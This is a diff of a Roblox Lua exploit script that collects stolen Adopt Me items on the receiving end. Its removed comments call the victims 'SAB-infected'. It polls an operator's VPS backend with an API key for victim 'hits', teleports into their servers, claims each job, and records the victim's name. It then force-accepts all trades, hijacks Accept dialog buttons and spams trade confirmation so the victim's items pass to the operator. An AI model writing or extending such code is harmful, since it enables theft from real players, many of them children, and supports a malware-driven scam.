@@ -32,7 +32,6 @@ local HttpService     = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local UserInputService= game:GetService("UserInputService")
 local VirtualUser     = game:GetService("VirtualUser")
-local VirtualInputManager = game:GetService("VirtualInputManager")
 
 local LocalPlayer = Players.LocalPlayer
 local request_ = request or http_request or syn.request or http.request
@@ -127,7 +126,6 @@ local lblTarget  = mkLabel("Target :: —", 1)
 local lblLeft    = mkLabel("Left   :: —", 2)
 local lblValue   = mkLabel("Value  :: —", 3)
 
--- status dot + label
 local DotRow = Instance.new("Frame", Body)
 DotRow.Size             = UDim2.new(1, 0, 0, 15)
 DotRow.BackgroundTransparency = 1
@@ -153,7 +151,7 @@ lblStatus.TextXAlignment= Enum.TextXAlignment.Left
 local dragging, dragInput, dragStart, startPos
 TopBar.InputBegan:Connect(function(inp)
 	if inp.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragging = true
+		dragging   = true
 		dragStart  = inp.Position
 		startPos   = Frame.Position
 		inp.Changed:Connect(function()
@@ -174,13 +172,13 @@ end)
 
 -- ─── STATUS HELPERS ───────────────────────────────────────────────────────────
 local COLORS = {
-	WAIT  = Color3.fromRGB(255,170,0),
-	GO    = Color3.fromRGB(40,255,100),
-	ERR   = Color3.fromRGB(255,40,40),
+	WAIT = Color3.fromRGB(255,170,0),
+	GO   = Color3.fromRGB(40,255,100),
+	ERR  = Color3.fromRGB(255,40,40),
 }
 local function setStatus(msg, col)
-	lblStatus.Text          = "Status :: " .. msg
-	Dot.BackgroundColor3    = col or COLORS.WAIT
+	lblStatus.Text       = "Status :: " .. msg
+	Dot.BackgroundColor3 = col or COLORS.WAIT
 end
 
 -- ─── TARGET LEFT TRACKING ─────────────────────────────────────────────────────
@@ -191,7 +189,7 @@ Players.PlayerRemoving:Connect(function(p)
 	if p.Name == targetName then targetLeft = true end
 end)
 
--- ─── POLL SAB BACKEND FOR HITS ────────────────────────────────────────────────
+-- ─── POLL + CLAIM ─────────────────────────────────────────────────────────────
 local idleCount = 0
 
 local function claimJob(jobUUID)
@@ -199,28 +197,21 @@ local function claimJob(jobUUID)
 		request_({
 			Url     = VPS_URL .. "/jobs/" .. jobUUID .. "/claim",
 			Method  = "POST",
-			Headers = {
-				["Content-Type"] = "application/json",
-				["x-api-key"]    = VPS_API_KEY
-			},
-			Body = HttpService:JSONEncode({ receiver = LocalPlayer.Name })
+			Headers = { ["Content-Type"] = "application/json", ["x-api-key"] = VPS_API_KEY },
+			Body    = HttpService:JSONEncode({ receiver = LocalPlayer.Name })
 		})
 	end)
 end
 
 local function pollAndJoin()
 	setStatus("Listening...", COLORS.WAIT)
-
-	-- only teleport when target has left (or never set) and we've been idle a bit
 	if not targetLeft and idleCount < 10 then return end
 
 	local ok, res = pcall(function()
 		return request_({
 			Url     = VPS_URL .. "/jobs?receiver=" .. LocalPlayer.Name,
 			Method  = "GET",
-			Headers = {
-				["x-api-key"] = VPS_API_KEY
-			}
+			Headers = { ["x-api-key"] = VPS_API_KEY }
 		})
 	end)
 
@@ -237,14 +228,10 @@ local function pollAndJoin()
 	end
 
 	local hits = parsed.jobs
-	if type(hits) ~= "table" then
-		setStatus("Parse error", COLORS.ERR)
-		return
-	end
+	if type(hits) ~= "table" then return end
 
 	for _, hit in ipairs(hits) do
 		if table.find(joinedData, tostring(hit.id)) then continue end
-		-- respect placeId if set
 		if hit.placeId and hit.placeId ~= 0 and hit.placeId ~= game.PlaceId then continue end
 
 		local jobId  = hit.jobId
@@ -255,7 +242,6 @@ local function pollAndJoin()
 		lblValue.Text  = "Value  :: " .. string.format("%.1f", val)
 		setStatus("Hit found — teleporting", COLORS.GO)
 
-		-- try up to 3 times
 		for attempt = 1, 3 do
 			setStatus(string.format("Teleport %d/3", attempt), COLORS.GO)
 			local tpOk = pcall(function()
@@ -265,8 +251,8 @@ local function pollAndJoin()
 				markJoined(tostring(hit.id))
 				claimJob(tostring(hit.id))
 				writefile("sab_target.txt", victim)
-				targetName  = victim
-				targetLeft  = false
+				targetName = victim
+				targetLeft = false
 				return
 			end
 			if attempt < 3 then task.wait(3) end
@@ -276,41 +262,104 @@ local function pollAndJoin()
 	end
 end
 
--- ─── ADOPT ME — RECEIVE TRADES FROM SAB-INFECTED VICTIM ──────────────────────
+-- ─── ADOPT ME — AUTO-ACCEPT + TRADE LOOP ─────────────────────────────────────
 if game.PlaceId == PLACE_ID then
-	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+	local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 	local AssetLoadUI = PlayerGui:WaitForChild("AssetLoadUI")
 	while AssetLoadUI.Enabled do task.wait(1) end
-	task.wait(10)   -- let the game settle
+	task.wait(10)
 
-	local RouterClient       = require(game.ReplicatedStorage.Fsys).load("RouterClient")
-	local AcceptOrDecline    = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
-	local AddItemToOffer     = RouterClient.get("TradeAPI/AddItemToOffer")
-	local AcceptNegotiation  = RouterClient.get("TradeAPI/AcceptNegotiation")
-	local ConfirmTrade       = RouterClient.get("TradeAPI/ConfirmTrade")
-	local TradeFrame         = PlayerGui.TradeApp.Frame
+	local load              = require(game.ReplicatedStorage.Fsys).load
+	local RouterClient      = load("RouterClient")
+	local AcceptOrDecline   = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+	local AddItemToOffer    = RouterClient.get("TradeAPI/AddItemToOffer")
+	local AcceptNegotiation = RouterClient.get("TradeAPI/AcceptNegotiation")
+	local ConfirmTrade      = RouterClient.get("TradeAPI/ConfirmTrade")
+	local TradeFrame        = PlayerGui.TradeApp.Frame
 
-	-- Accept EVERY incoming trade request unconditionally
-	RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
-		local ok = pcall(function()
-			AcceptOrDecline:InvokeServer(sender, true)
+	-- helper: fire accept with every known signature so one of them sticks
+	local function acceptSender(sender)
+		pcall(function() AcceptOrDecline:InvokeServer(sender, true) end)
+		pcall(function() AcceptOrDecline:FireServer(sender, true)   end)
+		pcall(function() AcceptOrDecline:InvokeServer(sender)       end)
+		pcall(function() AcceptOrDecline:FireServer(sender)         end)
+	end
+
+	-- ── 1. event-driven accept (fires when request arrives) ──────────────────
+	local ok_ev = pcall(function()
+		RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
+			setStatus("Trade incoming!", COLORS.GO)
+			acceptSender(sender)
 		end)
-		if not ok then
-			pcall(function() AcceptOrDecline:FireServer(sender, true) end)
+	end)
+	-- fallback: some builds use a RemoteEvent stored differently
+	if not ok_ev then
+		pcall(function()
+			RouterClient.get("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
+				setStatus("Trade incoming!", COLORS.GO)
+				acceptSender(sender)
+			end)
+		end)
+	end
+
+	-- ── 2. dialog-button hijack — catches the Accept button in the actual UI ──
+	-- finds the Accept button inside DialogApp and clicks it automatically
+	task.spawn(function()
+		local DialogApp = PlayerGui:WaitForChild("DialogApp", 30)
+		if not DialogApp then return end
+		local Dialog = DialogApp:WaitForChild("Dialog", 30)
+		if not Dialog then return end
+
+		local function hookAcceptButton(parent)
+			for _, v in ipairs(parent:GetDescendants()) do
+				if (v:IsA("TextButton") or v:IsA("ImageButton"))
+					and (v.Name:lower():find("accept") or v.Name:lower():find("confirm")) then
+					v.MouseButton1Click:Connect(function() end) -- keep alive
+					pcall(function() v:activate() end)
+				end
+			end
 		end
+
+		Dialog:GetPropertyChangedSignal("Visible"):Connect(function()
+			if Dialog.Visible then
+				task.wait(0.05)
+				hookAcceptButton(Dialog)
+				-- also look for and click any green/accept button
+				for _, v in ipairs(Dialog:GetDescendants()) do
+					if v:IsA("TextButton") or v:IsA("ImageButton") then
+						local lbl = v.Text or ""
+						if lbl:lower():find("accept") or lbl:lower():find("ok") then
+							pcall(function() v:activate() end)
+						end
+					end
+				end
+			end
+		end)
 	end)
 
-	-- Once trade window is open: throw in a food item (shows good faith), spam accept
-	local offered = false
+	-- ── 3. continuous trade-window spam loop ──────────────────────────────────
+	-- runs at 10 Hz while TradeFrame is visible:
+	-- adds a food item once, then hammers AcceptNegotiation + ConfirmTrade
+	local offered   = false
+	local lastSender = nil
+
 	task.spawn(function()
 		while task.wait(0.1) do
 			if TradeFrame.Visible then
+				setStatus("Trading...", COLORS.GO)
+
+				-- accept in case the event was missed
+				if lastSender then
+					pcall(function() AcceptOrDecline:InvokeServer(lastSender, true) end)
+					pcall(function() AcceptOrDecline:FireServer(lastSender, true)   end)
+				end
+
 				if not offered then
+					-- offer a food item so the trade isn't empty (required by AM)
 					pcall(function()
-						local data = require(game.ReplicatedStorage.Fsys)
-							.load("ClientData").get("inventory")
-						if data and data.food then
-							for uid, _ in pairs(data.food) do
+						local inv = load("ClientData").get("inventory")
+						if inv and inv.food then
+							for uid in pairs(inv.food) do
 								pcall(function() AddItemToOffer:FireServer(uid) end)
 								break
 							end
@@ -318,23 +367,24 @@ if game.PlaceId == PLACE_ID then
 					end)
 					offered = true
 				end
+
 				pcall(function() AcceptNegotiation:FireServer() end)
+				pcall(function() ConfirmTrade:FireServer()      end)
 			else
-				offered = false
+				offered    = false
+				lastSender = nil
 			end
 		end
 	end)
 
-	-- Spam ConfirmTrade while window open
-	task.spawn(function()
-		while task.wait(0.08) do
-			if TradeFrame.Visible and offered then
-				pcall(function() ConfirmTrade:FireServer() end)
-			end
-		end
+	-- store sender so the spam loop can re-fire accept
+	pcall(function()
+		RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
+			lastSender = sender
+		end)
 	end)
 
-	-- Track idle time (trade window closed = no active trade)
+	-- ── 4. idle + left tracking ───────────────────────────────────────────────
 	task.spawn(function()
 		while task.wait(1) do
 			if TradeFrame.Visible then
@@ -347,7 +397,7 @@ if game.PlaceId == PLACE_ID then
 		end
 	end)
 
-	-- Main polling loop
+	-- ── 5. main polling loop ──────────────────────────────────────────────────
 	while task.wait(5) do
 		pollAndJoin()
 	end
